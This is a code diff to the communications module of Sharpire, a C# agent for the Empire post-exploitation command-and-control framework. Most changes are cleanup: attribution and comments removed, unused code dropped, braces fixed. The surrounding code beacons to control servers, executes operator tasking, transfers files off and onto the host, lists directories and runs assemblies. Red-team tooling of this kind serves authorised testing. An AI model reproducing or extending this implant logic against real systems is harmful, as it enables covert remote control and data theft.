@@ -1,18 +1,11 @@
-﻿// Original Author: 0xbadjuju (https://github.com/0xbadjuju/Sharpire)
-// Updated and Modified by: Jake Krasnov (@_Hubbl3)
-// Project: Empire (https://github.com/BC-SECURITY/Empire)
-
-
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.IO;
-using System.IO.Pipes;
 using System.IO.Compression;
 using System.Linq;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Reflection;
-using System.Security.Cryptography;
 using System.Text;
 using System.Threading;
 
@@ -26,10 +19,7 @@ namespace Sharpire
         private int ServerIndex = 0;
 
         private JobTracking jobTracking;
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Default Constructor
-        ////////////////////////////////////////////////////////////////////////////////
+        
         internal Coms(SessionInfo sessionInfo)
         {
             this.sessionInfo = sessionInfo;
@@ -60,10 +50,7 @@ namespace Sharpire
 
             return routingPacketData;
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
+        
         internal void DecodeRoutingPacket(byte[] packetData, ref JobTracking jobTracking)
         {
             this.jobTracking = jobTracking;
@@ -93,11 +80,6 @@ namespace Sharpire
 
                 byte[] extra = routingPacket.Skip(10).Take(2).ToArray();
                 uint packetLength = BitConverter.ToUInt32(routingData, 12);
-
-                if (packetLength < 0)
-                {
-                    break;
-                }
 
                 if (sessionInfo.GetAgentID() == packetSessionId)
                 {
@@ -130,13 +112,13 @@ namespace Sharpire
                 string selectedTaskURI = sessionInfo.GetTaskURIs()[random.Next(0, sessionInfo.GetTaskURIs().Length)];
                 results = webClient.DownloadData(sessionInfo.GetControlServers()[ServerIndex] + selectedTaskURI);
             }
-            catch (WebException webException)
+            catch (WebException)
             {
                 MissedCheckins++;
-                if ((int)((HttpWebResponse)webException.Response).StatusCode == 401)
-                {
-                    //Restart everything
-                }
+                // if ((int)((HttpWebResponse)webException.Response).StatusCode == 401)
+                // {
+                //     //Restart everything
+                // }
             }
             return results;
         }
@@ -155,11 +137,11 @@ namespace Sharpire
                 webClient.Proxy = WebRequest.GetSystemWebProxy();
                 webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
                 webClient.Headers.Add("User-Agent", sessionInfo.GetUserAgent());
-                //Add custom headers
+
                 try
                 {
                     string taskUri = sessionInfo.GetTaskURIs()[random.Next(sessionInfo.GetTaskURIs().Length)];
-                    byte[] response = webClient.UploadData(controlServer + taskUri, "POST", routingPacket);
+                    webClient.UploadData(controlServer + taskUri, "POST", routingPacket);
                 }
                 catch (WebException) { }
             }
@@ -172,14 +154,10 @@ namespace Sharpire
             PACKET firstPacket = DecodePacket(taskingBytes, 0);
             byte[] resultPackets = ProcessTasking(firstPacket);
             SendMessage(resultPackets);
-
-            int offset = 12 + (int)firstPacket.length;
-            string remaining = firstPacket.remaining;
         }
 
         private byte[] ProcessTasking(PACKET packet)
         {
-            byte[] returnPacket = new byte[0];
             try
             {
                 int type = packet.type;
@@ -220,7 +198,6 @@ namespace Sharpire
                         string output;
                         if (parts[0] == "Set-Delay")
                         {
-                            Console.WriteLine("Current delay" + sessionInfo.GetDefaultDelay());
                             sessionInfo.SetDefaultDelay(UInt32.Parse(parts[1]));
                             sessionInfo.SetDefaultJitter(UInt32.Parse(parts[2]));
                             output = "Delay set to " + parts[1] + " Jitter set to " + parts[2];
@@ -294,10 +271,7 @@ namespace Sharpire
             string tableString = table.ToString();
             return EncodePacket(packet.type, tableString, packet.taskId);
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Check this one for UTF8 Errors
-        ////////////////////////////////////////////////////////////////////////////////
+        
         internal byte[] EncodePacket(ushort type, string data, ushort resultId)
         {
             data = Convert.ToBase64String(Encoding.UTF8.GetBytes(data));
@@ -315,10 +289,7 @@ namespace Sharpire
 
             return packet;
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Working
-        ////////////////////////////////////////////////////////////////////////////////
+        
         [StructLayout(LayoutKind.Sequential, Pack = 1)]
         public struct PACKET
         {
@@ -331,10 +302,7 @@ namespace Sharpire
             public string data;
             public string remaining;
         };
-
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
+        
         private PACKET DecodePacket(byte[] packet, int offset)
         {
             PACKET packetStruct = new PACKET();
@@ -350,10 +318,7 @@ namespace Sharpire
             packet = null;
             return packetStruct;
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Working
-        ////////////////////////////////////////////////////////////////////////////////
+        
         internal static byte[] NewInitializationVector(int length)
         {
             Random random = new Random();
@@ -364,10 +329,7 @@ namespace Sharpire
             }
             return initializationVector;
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Download File from Agent
-        ////////////////////////////////////////////////////////////////////////////////
+        
         public byte[] Task41(PACKET packet)
         {
             try
@@ -402,8 +364,7 @@ namespace Sharpire
                 return EncodePacket(0, $"[!] Error: {ex.Message}", packet.taskId);
             }
         }
-
-
+        
         private string ParsePath(string[] parts, out bool isChunkSizeAdjusted)
         {
             isChunkSizeAdjusted = false;
@@ -454,10 +415,7 @@ namespace Sharpire
 
             } while (true);
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Upload File to Agent
-        ////////////////////////////////////////////////////////////////////////////////
+        
         private byte[] Task42(PACKET packet)
         {
             string[] parts = packet.data.Split('|');
@@ -512,7 +470,7 @@ namespace Sharpire
 
             if (path.Equals("/"))
             {
-            // if the path is root, list drives as directories
+                // if the path is root, list drives as directories
                 sb.Append("{ \"directory_name\": \"/\", \"directory_path\": \"/\", \"items\": [");
                 DriveInfo[] allDrives = DriveInfo.GetDrives();
                 foreach (DriveInfo d in allDrives)
@@ -533,12 +491,10 @@ namespace Sharpire
             }
             else if (!Directory.Exists(path))
             {
-                // if path doesn't exist
                 sb.Append("Directory " + path + " not found.");
             }
             else
             {
-                // Process the list of files found in the directory.
                 string fullPath = Path.GetFullPath(path);
                 string[] split = fullPath.Split('\\');
                 string dirName = split[split.Length - 1];
@@ -559,22 +515,19 @@ namespace Sharpire
                         .Append("\", \"is_file\": ")
                         .Append(File.Exists(filePath) ? "true" : "false")
                         .Append(" },");
+                }
+                sb.Remove(sb.Length - 1, 1);
+                sb.Append("] }");
             }
-            sb.Remove(sb.Length - 1, 1);
-            sb.Append("] }");
-          }
             return EncodePacket(packet.type, sb.ToString(), packet.taskId);
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Excute assembly tasking
-        ////////////////////////////////////////////////////////////////////////////////
+        
         public Byte[] Task122(PACKET packet)
         {
-            const int Delay = 1;
+            const int delay = 1;
             const int MAX_MESSAGE_SIZE = 1048576;
             string output = "";
-            object synclock = new object(); // Define synclock for thread synchronization
+            object synclock = new object();
 
             // Split packet data
             string[] parts = packet.data.Split(',');
